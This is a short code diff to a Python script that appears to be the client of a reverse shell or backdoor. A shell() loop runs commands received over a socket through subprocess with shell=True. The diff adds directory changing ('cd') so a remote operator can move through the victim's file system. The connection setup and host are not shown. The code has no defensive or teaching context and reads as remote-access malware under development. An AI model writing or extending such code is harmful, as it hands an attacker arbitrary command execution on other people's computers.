@@ -1,6 +1,7 @@
 import socket
 import json
 import subprocess
+import os
 
 def send(data):
     jsonData = json.dumps(data)
@@ -33,6 +34,9 @@ def shell():
 
         elif command == 'clear':
             pass
+
+        elif command[:3] == 'cd ': # Change to the specified directory
+            os.chdir(command[3:])
 
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
